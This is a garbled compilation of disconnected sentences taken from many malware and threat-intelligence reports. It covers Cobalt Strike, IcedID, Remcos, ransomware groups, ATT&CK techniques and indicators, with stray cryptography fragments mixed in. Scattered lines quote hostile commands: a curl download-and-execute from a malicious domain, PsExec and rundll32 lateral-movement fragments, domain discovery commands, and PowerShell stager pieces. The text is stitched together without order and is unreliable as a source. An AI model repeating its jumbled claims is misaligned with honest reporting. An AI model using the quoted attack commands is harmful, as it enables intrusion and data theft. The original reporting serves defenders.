When it comes to Cobalt Strike infrastructure, the known JA3 and JA3s signatures that we are looking for are: JA3 72a589da586844d7f0818ce684948eea a0e9f5d64349fb13191bc781f81f42e1 JA3s b742b407517bac9536a77a7b0fee28e9 ae4edc6faf64d08308082ad26be60767 By using JA3/S signatures, we can discover various malware C2 servers and not just Cobalt Strike.
Stage 1:
Click here for a PDF version of this report. 
The seemingly opportunistic nature of this campaign and subsequent data theft activity is consistent with activity that we’ve seen from extortion actors, which means victim organizations could potentially receive ransom emails in the coming days to weeks.
Provide social engineering and phishing training to employees. 
Forked DLL Loader thread function. 
[T1025] Data Staged: Local Data Staging [T1074.001] Screen Capture [T1113] Email Collection:
Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at .
Figure 4.
With this objective in mind, we will delve into custom modifications to the server side of MaccaroniC2, uncovering fundamental concepts that enable us to effectively weaponize our tool for diverse real-world scenarios. 
Figure 9.
The Attack kill chain used by Enigma Stealer operator (click the image for a larger version) Using fake cryptocurrency interviews to lure victims 
timeout 10 & curl perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D -s -d md -A cur1-agent -o %documents%\macroor.dll& %documents%\macroor.dll #1 perseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D Also, we observed this group introduce a new Windows executable-type downloader at this time.
In December 2022, a specific domain was registered to market/sell the tool, seroxen[.]com.
Removable Media
T1120Peripheral Device
It creates a named pipe server and reflectively injects the webinjects module into web browsers.
Fig 6. SINGLE_STEP
This threat demonstrates several techniques of the MITRE ATT&CK framework, most notably T1202 - Indirect Command Execution , T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer, T1071.001 - Application Layer Protocols:Web Protocols. 
Scroll to view full table Data collected by Nemesis can be accessed by the operator via a web-based control panel. 
(It differs sample to sample) Fig 10.
FROM Win32_Process' func_AvailableLanguage() Get the install input language Screen Capture Based on one of the RedLine samples we analyzed, we saw that it has a functionality to capture a screenshot of the targeted or compromised host as part of its data collection and exfiltration.
However, unlike ABPASS, it hijacks the ms-windows-store protocol.
Infection chain As we previously mentioned in our past blog entry, the entire attack begins with a spear-phishing email.
Summary We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.
We do not believe that this was successful in this environment, due in part to the lack of additional signs of compromise specific to this Domain.
files as droppers.
Once decoded, the loader's execution jumps to the beginning of the DLL resulting in a reflective-load of the beacon into the loader process memory.
to MEGA Userstorage ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET USER_AGENTS
Figure 3 shows an example of a target list created by the attacker, which mainly contains Taiwanese government entities.
We also noticed that ViperSoftX’s primary C&C servers for the second stage download would change on a monthly basis: 
PCArrowI seems to correspond to FlowCloud. 
In the original analysis of Apostle, SentinelOne notes that “Proper execution of the ransomware version requires supplying it with a base64 encoded argument containing an XML of an ‘RSAParameters’ object.
Qualys TRU detected an info stealer involved in the infection chain and considers it as a later-stage payload. 
Crash course in DNS attacksThere are several types of DNS attacks, each function differently, have unique impacts, and require specific countermeasures. 
Ensure that User-ID is only enabled for internal trusted interfaces Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure remote access capabilities for the User-ID service account are forbidden. 
The TA581 campaign ended up loading the DLL “host.dll” from that same directory and led to one of the first campaigns of Proofpoint observing the Forked variant.
Timeline Analysis and reporting completed by @0xtornado and @MetallicHack Initial Access 
It detects suspicious sign-in attempts and raises any of the following alerts: Anomalous Token. 
No -dn <devicename>Specifies which drive to connect with on a remote system over SMB.
Malicious commands abusing the SilentCleanup service We observed that the threat actors used this technique to execute c:\users\public\1.exe. 
FTP server Kodex Ransomware EvilExtractor also has a ransomware function.
YARA and Snort rules for these implants are available in ESET’s GitHub repository. 
T1562.004.
Keys found in CurrentVersion\Run contain references to programs that will execute when a user logs in. 
Latest Attacks of the Threat Actor In January 2022, cybersecurity researchers reported that MuddyWater targeted Turkish private organizations and governmental agencies.
Converting domain name to IP address [3] Neo-reGeorg: Reverse proxy tool [4] Nuclei: Vulnerability scanner
0x6A where Value 2 depicts size of instruction (mov, jg, jne etc.) where exception is raised. 
Technical Weakness Identification CISA analysts consistently observe targeting, scanning, and probing of significant vulnerabilities within days of their emergence and disclosure.
Here’s what each line does: $down = New-Object System.
title: Tailoring Sandbox Techniques to Hidden Threats url: https://unit42.paloaltonetworks.com/tailoring-sandbox-techniques/ Executive Summary Malware authors often throw curve balls that are meant to confound automated detection systems.
However, it focuses on redundancy to gain a foothold on the infected machine, including setting up multiple persistency tasks, communication with several different C&C servers, and different types of C&C command execution. 
While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.
This access was used to perform enumeration and move laterally to other hosts. 
Use cloud infrastructure configuration scanning tools that enable governance, risk management and compliance (GRC) to identify potentially threatening misconfigurations. 
– Selling together with all sources (build, builder, panel) FUNCTIONALITY : Spoiler: STEALER – Log collection takes place in memory – Collection of data from Chromium browsers (Cookies/CC/Passwords/Autofills/Bookmars/History) v80+ – Collection of data from Gecko browsers (Cookies/Passwords/Bookmark/History) v80+ – Collection of RDP/FTP sessions – Grabbink files from the desktop (by extension) – Collection of UserAgent – Collection of information about the system in HTML format – Collect Vpn (NordVpn/OpenVpn/ProtonVpn) –
= 0xF7 → avp.exe PROC_FLAG
TA0007 Discovery T1087.002.
Injection occurs by creating a section via a ZwCreateSection call, getting access to it from the parent and child processes via ZwMapViewOfSection calls, copying shellcode to the section, and placing a jump to the shellcode at the entry point for spoolsv.exe. 
This can make the malware distribution easier and less reliant on specific Python versions or configurations. 
Additional functions Remcos has been known to utilize are shown in Table 1 below.
Using ReversingLabs Software Supply Chain Security, my team was able to detect and extract this code from the decompiled PYC file.
In its latest campaign, the SharpPanda APT group employs a forged document linked to G7 to target various governments within the G20 forum. 
Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule. 
EmptyTrash() – This function is responsible for deleting all files and directories in the user’s trash folder.
onstart /RU SYSTEM schtasks /run
Zcash’s definition of Pedersen hash is unequivocal regarding the collision-resistance of the hash function when using variable-length input, as stated on page 78 of [Zcash]:\n\nThese hash functions are not collision-resistant for variable-length inputs.\n\n\n
This script is for executing the PowerShell script via
T1055File Deletion – T1070.004LSASS Memory – T1003.001Kerberoasting – T1558.003Domain Account – T1087.002Domain Trust Discovery – T1482Lateral Tool Transfer –
Command codes in the PUBLOAD HTTP variant In addition, we found some interesting debug strings and event names among the PUBLOAD samples. 
Miscellaneous commands 0x8018A0 
Aside from the differences in C2 tools used (AnyDesk vs Cloudflared), one of the key points to highlight is the dwell time.
Example of the loader’s generated configuration (upper is encrypted, lower decrypted) 
+65.6983.8730 Japan: +81.50.1790.0200 Indicators of Compromise Ransom Cartel Samples 9935DA29F3E4E503E4A4712379CCD9963A730CCC304C2FEC31E8276DB35E82E8BF93B029CCA0DE4B6F32E98AEEBD8FD690964816978A0EB13A085A80D4B6BF4E55e4d509de5b0f1ea888ff87eb0d190c328a559d7cc5653c46947e57c0f01ec52411a74b343bbe51b2243985d5edaaabe2ba70e0c923305353037d1f442a91f5 Network-based IoCs 185.239.222[.]240 TOR Exit Node108.62.103[.]193 TOR Exit Node185.129.62[.]62 TOR Exit Node185.143.223[.]13 Bulletproof hosting server185.253.163[.]23 PIA VPN exit node Indicators of compromise and Ransom Cartel-associated TTPs can be found in the Ransom Cartel ATOM. 
Apr. 26, 2023.
The ISO file was delivered as a ZIP archive via a malicious spam mail campaign. 
The significant level of proliferation suggests that it is well-funded and includes a large team of skilled individuals, likely enabling it to carry out attacks on multiple targets simultaneously. 
Process Hashes and Process Privilege Checks Upon being loaded, the malware starts a subroutine that hashes each running process on the system, and compares each hash with 3 hardcoded hashes: 0x6403527E → avp.exe associated with Kaspersky AV 0x23214B44 → ns.exe associated with Norton Security 0x651B3005 → ccSvcHst.exe associated with Symantec A global flag PROC_FLAG is used to track which of the 3 processes are running on the system. PROC_FLAG
[WINDOWS-CLIPBOARD] proxychains command 5008382 
The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion.
The script shown above uses the address 0xC2.11808979 in the URL, which translates to the IPv4 address 194.180.48.211.
They quickly adopted the malware-as-a-service model and expanded their reach abroad, creating a toolset that included backdoors, uploaders and stealers in a modular fashion.
The ZIP file contains LNK files that act as Windows shortcuts to other files.
AND (f.filename = 'ffmpeg.dll' OR f.filename LIKE 'd3dcompiler%.dll' OR f.filename = 'trololo.dll') 
Credentials from Password Stores Trigona operators use Mimikatz to dump passwords. T1003.001.
As with the previous example, the motives for this registration are unclear.
All of the fraudulent transactions were debit charges.
Through Removable MediaThe attackers have used njRAT, which can be configured to spread via removable drives. 
Please share your thoughts.
Shellbags were also instrumental in identifying the cookie theft activity.
A software supply chain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that victim company’s software; in this case, an installer, rather than the software itself, was modified by UNC2465. 
Their ransom note pointed the victims to their negotiation portal instead.
In 2022, we noticed that they updated SysUpdate, one of their custom malware families, to include new features and add malware infection support for the Linux platform. 
It is worth noting that the default method is the DNS TXT record data channel.
Based on our observations, Earth Preta tends to hide malicious payloads in fake files, disguising them as legitimate ones — a technique that has been proven effective for avoiding detection.
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskFlowCloud creates a scheduled task for persistence. 
Phishing: Spearphishing Link
The CrowdStrike Falcon Platform’s Continuous Monitoring and Visibility The Falcon platform takes a layered approach to protect workloads.
In the vast majority of cases these NSIS droppers decrypt and run the Remcos RAT, but we have also seen cases where the payload is njRAT.
T1113Screen
Based on Talos’ analysis of the domain registration information for the attacker’s infrastructure, Talos assesses with high confidence that this campaign began in November 2020 and has been ongoing through 2023.
C:\s$\0.bat PsExec.exe -d \\[HOSTNAME] -u
Tax firms targeted by precision malware attacks
Debug register check. 
The .NET injectors and bootstrappers contain clean code and meaningful function/method/variable names, and they use detailed log/error messages.
Figure 3: Details of the recent Gh0st RAT sample’s C2 server on the network information service Shodan. 
Figure 52.
I’ll also tell you what our researchers found when investigating the command-and-control (C2) infrastructure used by the malware — and provide evidence of successful attacks. 
After gaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems.
We assess it is highly likely that these attacks were conducted by a Chinese cyberespionage actor related to the Operation Soft Cell campaign. 
It was released in 2016 by BreakingSecurity, a European company that markets Remcos and other offensive security tools as legitimate software.
Temporarily blocklist a client’s IP address if it sends too many NXDomain requests.
More details on Royal ransomware’s other capabilities can be found in Trend Micro’s Threat Encyclopedia. 
However, OSINT led us to find the next action. 
Win32.ToolPow.
The fake PsExec is an open-source Python script that is a PsExec alternative with shell/backdoor capability.
Conclusion UNC2465 established initial access via a Trojanized installer executed by an unsuspecting user.
It carries out several checks to verify that it is running in a real victim’s environment: It verifies that the process hosting the malicious DLL is named solarwinds.businesslayerhost.exe 
public static extern bool ShowWindow(int handle, int stat);';add-type -name win -member $WindowState -namespace native;[native.win]::ShowWindow(([System.
These dark web shops and marketplaces specialize in the sale of compromised account credentials, remote desktop protocol (RDP) and secure shell (SSH) accesses, and infostealer malware logs that can be utilized to gain access to a victims network.
This information, if leveraged by an opportunistic threat actor, criminal, or nation-state, could prove to be damaging to the national security of Mexico and Brazil.
Management.
2172812BE94BFBB5D11B43A8BF53F8D3AE323636Skype-x64.msiWin32/Agent.
[5] “Remcos Instructions Manual,” Breaking Security, accessed May 4, 2021, published July 2018, https://breaking-security.net/wp-content/uploads/dlm_uploads/2018/07/Remcos-Instructions-Manual-rev19.pdf, 15-16. 
One such breach was the operation known as “GhostNet” in 2009, in which a large-scale cyber-attack used Gh0st RAT to conduct surveillance and espionage.
Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6. 
The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file. 
The prefix is used to hide files, directories, NamedPipes, scheduled tasks, processes, registry keys/values, and services. 
To get to the payload data, it starts by enumerating all the custom XML part objects in the document and then checking if they have a node named “TwXfx”.
The bulk of the victims they describe are in different regions than we observed which is likely caused by field of view bias.
It is also worth mentioning the brazen behaviour of this threat actor and their emboldened attempts at Social Engineering by offering payment for insiders to provide valid credentials. 
See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK:registered: tactics and techniques with corresponding mitigation and/or detection recommendations. 
The DFIR Report url: https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/ IcedID continues to deliver malspam emails to facilitate a compromise.
On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.
The original file is deleted using the cmd command. 
Threat hunting was conducted within the logs. 
[T1219 – Remote Access Software] UserAssist entry: 86 Value name: C:\Users\administrator.<Redacted> \AppData\Local\Microsoft\Windows\INetCache\IE\14J9H2AA\AnyDesk.exe Count: 1 Event ID [7045] "Service Name: Anydesk" "C:\Program Files (x86)\AnyDesk\AnyDesk.exe"" --service" Prefetch
Valid Accounts Compromised accounts may be used to maintain access to the network. 
The dropper generates and executes a script to download, configure and execute a copy of a XMRig miner.
Obfuscated Files or Information Uses encoded PowerShell commands. 
Second stage PowerShell is carved out of the payload package and executed.
Additionally, APT40 conducted internal spearphishing attacks [T1534]. BADFLICK/Greencrash China Chopper [S0020] Cobalt Strike [S0154] Derusbi/PHOTO [S0021] Gh0stRAT
The buffer turns out to be a next shellcodeFinally, the next shellcode is executed The name of the next file is loaded as a stack-based wide string The hashing function used for import resolving follows the same pattern in both cases, yet the constant used to initialize it (denoted as HASH_INIT) is different across the samples. 
The user is then prompted to open the single visible shortcut (2) file. 
Finally, Rorschach creates another group policy that registers a scheduled task which runs immediately and upon user logon, to run Rorschach’s main executable with the relevant arguments. 
Foreign cyber threat actors continue to exploit publicly known—and often dated—software vulnerabilities against broad target sets, including public and private sector organizations.
Service Stop T1497 Virtualization/Sandbox Evasion T1497.001 Virtualization/Sandbox Evasion: System Checks T1505.003 Server Software Component: Web Shell T1518 Software Discovery T1543.003 Create or Modify System Process: Windows Service T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1553.002 Subvert Trust Controls: Code Signing T1559.002 Inter-Process Communication: Dynamic Data Exchange T1560 
If no compromise is detected, apply these updates as soon as possible. 
ResultStatus == "Success" | where RawEventData has "dc50a0fb-09a3-484d-be87-e023b12c6440" //Exchange.ManageAsApp
Remote Access Software AnyDesk has been the most common legitimate desktop software used to establish an interactive command and control channel, with ConnectWise seen slightly less frequently. 
The final renaming of the encrypted machine files in Rorschach is implemented via NtSetInformationFile using FileInformationClass FileRenameInformation, just like in LockBit v2.0. 
We traced some of the commands executed by the attackers after gaining a foothold in the network, which point to lateral movement and exfiltration of information from particular machines.
In early 2022, we further discovered that Earth Zhulong abused group policy objects (GPO) to install loaders and launch Cobalt Strike on their target hosts.
/c net group enterprise admins /domain
Understanding TZW and GlobeImposter’s Shared Infrastructure Previous GlobeImposter payloads directed victims to a TOR-based portal at obzuqvr5424kkc4unbq2p2i67ny3zngce3tbdr37nicjqesgqcgomfqd[.]onion. 
In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800: Windows Security Logs discovery Once the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below. 
Affiliates keep an 80-90% share of the ransom payment, with the remainder going to the BlackCat author.
Unit 42 has observed the following TTPs being used by Vice Society in past incident response engagements involving the group.
Toy Example:
This malware tries to track logged in WordPress users to avoid injections — even when they log out of WordPress.
Spearphishing LinkThe attackers have used emails with a link to download malware. 
While not enabled in this sample, the loader also supports sleep obfuscation to hinder detection by memory scanners.
[PTsecurity] PlugX sid: 10001390;10001391;10002946;10004422;10004426;10004472;10004473;10004515;10004532;10005968; 10.
The Android version of popular game, Fortnite, has been discovered to contain a vulnerability that could allow for a “man-in-the-disk” attack.
These tactics require an extended detection and response (XDR) platform for more robust behavioral monitoring within a network. 
Here you would want to look for evidence of the ffmpeg.dll file being loaded, which would be indicative that this machine may be impacted by this campaign. 
-d C:\Windows\System32\rundll32.exe “C:\Windows\perfc.dat”,#1 18 “<additional creds for arguments>”” -accepteula → This suppresses the display of the license dialog -s
The threat actors began enumerating the network once Emotet deployed a Cobalt Strike beacon on the beachhead host.
That was the case with fshec2.
ESimplexTea for Linux. 
In later versions, the timestamps corresponded to the times when the samples were discovered.
Registry Key 13 FOCUSFJORD MD5 Hash Related C2 Suspected Target helen 3d95e1c94bd528909308b198f3d47620 139.59.81.253 Israel helen 
To make the new image runnable, several Windows API functions are resolved using GetProcAddress and directly patched into the memory of the loaded executable.
This can be extremely time consuming and requires a high degree of technical knowledge.
ADGet is an uncommon tool, however, its function is very similar to ADfind–the key difference is that LDAP queries are not passed, they are instead coded into the binary itself. 
Researchers at Tenable Research discovered two vulnerabilities in monitoring and surveillance company NUUO’s “Network Video Recorder” software in the “NVRMini2” network-connected, video recording device.
End users and enterprises alike can mitigate the risk of infection from new threats like Royal ransomware by following these security best practices: Enable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network. 
A word of thanks goes out to all the forensic experts, incident responders, and threat intelligence analysts who helped victims identifying and eradicating the adversary.
Additionally, we observed a significant increase in the sale of compromised credentials affecting LATAM government domains on dark web shops in Q1 and Q2 2022, relative to 2021.
Such access can be tracked with Sysmon event ID 10 (ProcessAccess).
It still downloads a PowerShell code (the main ViperSoftX script) to crawl through different paths in the system for cryptocurrency wallets.
POST /messagebroker/amf HTTP/1.1Host: s.peheavens.comConnection: keep-aliveContent-Length: <content_length>Origin: http://s.peheavens.comX-Requested-With: ShockwaveFlash/20.0.0.306User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36Content-Type: application/x-amfAccept: */*Referer: http://s.peheavens.com/html/portlet/ext/draco/resources/draco_manager.swf/[[DYNAMIC]]/1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: COOKIE_SUPPORT=true; JSESSIONID=5C7E7A60D01D2891F40648DAB6CB3DF4.jvm1; COMPANY_ID=10301; ID=666e7375545678695645673d; PASSWORD=7a4b48574d746470447a303d; LOGIN=6863303130; SCREEN_NAME=4a2b455377766b657451493d; GUEST_LANGUAGE_ID=en-US Figure 11.
We identified the HyperBro backdoor, which had been used in 2018, based on the distinctive file name combined with other confirmed tools.
Token Impersonation Impersonation occurs only if the process has the required privilege level to assume the identity of another user. 
While there are no indications of overlaps in individual devices, there are strong indications of targets intersecting, suggesting these groups are pursuing similar objectives.
Domino Backdoor shares code overlap with the Lizar (aka Tirion, Diceloader) family of malware, developed by ITG14.
[T1055.002] Chinese state-sponsored cyber actors have been observed: Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement. 
SMB beacons open a local port on the target host and listen for incoming communication from a parent beacon.
ModPipe architecture Our analysis shows that ModPipe uses modular architecture consisting of basic components and downloadable modules (for a better overview see Figure 1): initial dropper – contains both 32-bit and 64-bit binaries of the next stage – the persistent loader – and installs the appropriate version to the compromised machine. 
G. We have\n b ⋅ G = b0 ⋅ G + 2b1 ⋅ G + 22b2 ⋅ G + 23b3 ⋅ G + 24b4 ⋅ G + 25b5 ⋅ G= (b0 + 2b1 + 22b2) ⋅ G + 23 (b3 + 2b4 + 22b5)
A small Java-based application lives inside the chip and can be easily manipulated in order to create a “golden ticket” card that will be valid in most—if not all—point-of-sale systems.
They are targeting private and government organizations listed below: Defense Education Energy Financial Services Government and administration agencies Healthcare High-Tech International Organizations Media Countries affected by MuddyWater 
Cryptocurrency mining and ransomware 
2022wiqp[.]xyzAugust 2022ckws[.]infoJanuary 2023amarte[.]store March 2023Multi-stage attack chain uses PowerShell downloader and DLL sideloadingThis campaign involves a multi-stage attack chain that begins with a phishing email and leads to payload delivery through the execution of a PowerShell downloader script and sideloading to legitimate executables.
Log Domain Name Service (DNS) queries and consider blocking all outbound DNS requests that do not originate from approved DNS servers.
Windows Command Shell Uses cmd.exe to execute commands. 
Subvert Trust Controls: Code Signing T1553.002 TrickBot has come with a signed downloader component. 
The team then deployed Rubeus to capture the incoming DC TGT. Steal or Forge Kerberos Tickets: Golden Ticket T1558.001 
Finally, the EngimaDownloader_s002 downloads and executes the next-stage payload on the infected system.
This service has the highest privileges that can be abused for Windows 10 UAC bypass.
Its value is encrypted with RSA-1024 and placed in the ransom demand.
However, during our analysis, no response was received from the remote server. 
Parsing Shellbags for an administrative account leveraged by the threat actor resulted in entries similar to the below. 
Possible Traversal - File created in Public directory 5008349 
CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
on:%d by_enable:%d" fullword wide $s10 = "powrprof.dll,SetSuspendState" fullword wide $s11 = "%UserProfile%" fullword wide $s12 = " 2010-2019
After a more traditional vulnerability disclosure timeline, we plan to publish details about how this works. 
This is typically done to identify high-value targets that may be attractive, as attacks attempt to maximize their sphere of influence over as much of the environment as possible prior, eventually deploying ransomware and making their presence known.
Using vssadmin.exe to delete shadow copies The ransomware encrypts files using OpenSSL’s Advanced Encryption Standard (AES).
One of the primary tasks towards achieving credential-based deception is to stage the deceptive credentials in LSASS process memory.
With that, let’s move on to analyzing the session secret generation procedure. 
The required dependencies.
Remcos has also been observed using its “Watchdog” feature to restart the RAT if it is terminated (Figure 12). 
The following table summarizes the processes used for injection during this case: Injected Process Name Injection Payload C:\Windows\system32\winlogon.exe Cobalt Strike C:\Windows\System32\RuntimeBroker.exe Cobalt Strike C:\Windows\System32\svchost.exe Cobalt Strike C:\Windows\System32\taskhostw.exe Cobalt Strike C:\Windows\system32\dllhost.exe Cobalt Strike PowerTool PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.
A number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration.
Once a foothold is established, the attackers conduct a variety of reconnaissance, credential theft, lateral movement, and data exfiltration activities. 
Our clients using the Sucuri Website Firewall are protected from this vulnerability as our research team issued an emergency patch shortly after the vulnerability was disclosed.
International Limited2022-06-16ghg.telegream[.]online; C&C server. 
Figure 6.
echo
This is used as an integrity check for the decryption process. 
This is because the random number changes every time, but the end is the same “0x2191” result.
Perform ingress traffic analysis to identify transmissions that are outside of normal network behavior. 
WAFs can protect against web-based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic. 
5
Organizations using Zoho ManageEngine products vulnerable to CVE-2022-47966 should download and apply upgrades from the official advisory as soon as possible.
Powershell Stager with trigger $down = New-Object System.
This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions. 
DataMessage contains network-level data. 
Along with the control panel, a name and shame blog is also hosted, targeting victims who have either ignored or refused to pay the ransom.
T1047
Based on our research, this actor has sent high volumes of spam emails in short timeframes through other methods, such as connecting to mail servers from rogue IP addresses or sending directly from legitimate cloud-based bulk email sending infrastructure. 
Data gathered by the trojan is then extracted to an attacker-controlled server, researchers added.
Sign up for a free trial of Umbrella here.
A tweet about Cobalt Strike The infection flow is as follows: The archive file is delivered through a Google Drive link, which contains a legitimate EXE file, a malicious DLL file, and a decoy document written in Burmese.
Lastly, this will run a series of “stagers” with the object to delivery the final malware inside the victim’s computer. 
WMI provides many administrative capabilities on local and remote systems, including querying system information, starting and stopping processes, and setting conditional triggers.
Shellcode decryption loop The next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework.
For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). 
mw_construct_RELOC Calculate the delta between the previous image base and the current one. 
Figure 18 shows the infection chain for both. Figure 18.
The group uses a USB drive as an entry point into a target's system, indicating its preference for leveraging physical vectors for intrusion.
For each file found, the function calls the ExecPayload() function to execute the ransomware payload for encrypting them. 
This was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands. 
This results in six bytes — four for the random number, two for 0x2191 — and encodes the result further with Base32 algorithm using the alphabet “abcdefghijklmnopqrstuvwxyz012345”.
Part of the main routine for the injection of the payload is shown in Figure 19. Figure 19.
Contact: intelreports@kaspersky.com UEFI infection During our research, we found a UEFI bootkit that was loading FinSpy.
Monitor for and correlate changes to Registry entries. 
pc.dll and getHashFlsa64.dll share the same original filename: getHashFlsa64.dll. 
When executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dll.
RokRAT can execute remote C2 commands, data exfiltration, file download/upload, and keylogging.
[T1012] System Network Configuration Discovery [T1016] Remote System Discovery [T1018] System Owner/User Discovery [T1033] Network Sniffing [T1040] Network Service Scanning [T1046] System Network Connections Discovery [T1049] Process Discovery
The actor may then perform actions as the logged-on user. 
On each infected site the parameter names and hashes used for verifying passwords are different.
User execution
3D visualization of binary data of the different ransomware variants Visualizing data in such a manner is a way to use the human brain to quickly identify patterns and be able to draw comparisons between objects.
PowerShell script to create a ImmediateTask through GPO 
The Initial Loader The Initial Loader (/private/etc/logind) launches every time when the operating system boots up.
The IcedID Lite Loader observed in November 2022 contains a static URL to download a “Bot Pack” file with a static name (botpack.dat) which results in the IcedID Lite DLL Loader, and then delivers the Forked version of IcedID Bot, leaving out the webinjects and backconnect functionality that would typically be used for banking fraud. 
On doing so, the victim unknowingly installs the NetSupport RAT, a doctored version of the NetSupport Manager client (client32.exe) that gives the attacker immediate and direct control of the infected device.
Malicious Google Docs site We were unable to analyze the functionality behind the Request access web element as the group has taken down the site.
Example of the Powershell script that runs to deobfuscate the file: "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy
This opens up a ton of possibilities for how this shellcode is shipped, making signature-based detection on the delivery method a cat and mouse game.
Subsequent monitoring led us to discover a number of new malware samples used by the group in recent attacks.
Its name blends in with the rest of the legitimate code.
The mounted file contains a hidden folder (4), a 200+MB padded file and a visible shortcut file disguised as a zip. 
Late in March 2023, it was discovered that the desktop application for both Windows and macOS contained malicious code that enabled a group of attackers to download and run arbitrary code on all machines where the application was installed.
Table 1.
When individual users need the account, they submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion. 
[T1021.001], Lateral Tool Transfer [T1570], Software Deployment Tools
Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments [T1566.001] and by exploiting the following vulnerabilities against Microsoft Exchange servers [T1190]: CVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability CVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability CVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability After gaining access, Hive ransomware attempts to evade detention by executing processes to: Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption [T1562]. 
This means that only the DNS C2 leaving the victim’s network was logged.
Interested in Mac Malware Analysis Techniques? 
TimeStamp Check Analysis As part of our ongoing investigation, we found a timestamp mechanism in the code as shown below. 
In this article, we will share the results of our investigation of this targeted attack, which started with the compromise of a foreign office.
Your data is stolen and encrypted. 
Applying what we learned about the handshake, we observed the following in our traffic sample: Dword value 0
Then it creates two Windows shortcut files in the Windows startup folder using the Internet Explorer application icon and the target paths pointing to the two dropped batch scripts.
The first will be used to get packets from the server, and the second to send them. 
The phishing email came from a legitimate vendor "stoneworkers".
The target is then redirected to a legitimate file hosting site, where the actor has uploaded Windows shortcut (.LNK) files. 
Unit 42 did not identify any associated ransom notes and it’s unclear whether Victim 4 was impacted by Trigona. 
Detection Evasion:
During analysis of this variant, we have identified a significant enhancement in GuLoader’s one of most effective anti-debug technique that it’s custom Vectored Exception Handler. 
Umbrella, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network.
Figure 7 – Lockbit’s Ransom note We recommend referring to our previous blog post to comprehensively examine LockBit 2.0 and Lockbit 3.0 ransomware. 
+
The team observed inconsistencies on servers and workstations within the domain, including inconsistent membership in the local administrator group among different servers or workstations.
Registry keys changed by ABPASS 
Rorahsach takes inspiration from another ransomware strain: LockBit.
T1057
The other websites, possibly translated by the attackers, offer Chinese language versions of software that is not available in China, such as Telegram, as shown in Figure 3. Figure 3.
The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies. 
[T1548.002] Hijack Execution Flow: DLL Side-Loading [T1574.002] Defense Evasion
[A-Z0-9]{15}>.exe Rust executable compiled with Cargo Next, it creates a scheduled task that runs the Rust executable by passing it as an argument to rhc.exe.
= 0 new_array =
It invokes CryptGenKey to generate an AES-128 key.
Figure 5.
Mitigation and protection guidance The techniques used by this subset of Mint Sandstorm can be mitigated through the following actions: 
This technique provides several advantages to attackers, including stealthiness, persistence, and the ability to leverage the privileges and resources of the compromised process. 
Windows Command ShellTechniqueT1059.003https://attack.mitre.org/techniques/T1059/003/Scheduled Task/Job: Scheduled TaskTechniqueT1053.005https://attack.mitre.org/techniques/T1053/005/System
The decision for which of the versions should be applied is made based on the check if the process runs as Wow64 (emulated 32 bit on 64 bit Windows): If the process runs on a 32-bit system, the syscall can be made in a direct way, using SYSENTER: 
This function detects if the calling process is being debugged by a user-mode debugger.
The overwhelming majority of users do not need this access.
Cortex XDR: Identifies indicators associated with Ransom Cartel. 
T1033System Owner/User DiscoveryModPipe gathers username and computer name from victim machines and reports them to the C&C in initial message. 
